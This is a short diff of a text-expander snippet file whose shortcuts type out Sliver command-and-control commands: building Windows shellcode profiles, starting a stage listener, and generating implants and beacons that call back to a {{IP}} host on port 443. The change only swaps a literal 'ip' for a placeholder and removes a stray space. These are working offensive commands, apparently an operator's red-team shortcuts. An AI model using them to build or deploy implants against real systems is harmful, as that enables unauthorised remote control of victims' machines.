@@ -97,13 +97,13 @@ matches:
     replace: profiles new -a 386 --mtls {{IP}}:443 --format shellcode -o windows win-shellcodex86
 
   - trigger: ":sliverstage"
-    replace: stage-listener --url http://ip:8443 --prepend-size --profile win-shellcode
+    replace: stage-listener --url http://{{IP}}:8443 --prepend-size --profile win-shellcode
 
   - trigger: ":sliverdllgens"
     replace: generate -e -f shared -m {{IP}}:443 -R
 
   - tigger: ":sliverexegens"
-    replace: generate  -e -f exe -m {{IP}}:443
+    replace: generate -e -f exe -m {{IP}}:443
 
   - trigger: ":sliverdllgenb"
     replace: generate beacon -e -f shared -S 23 -J 13 -R -m {{IP}}:443
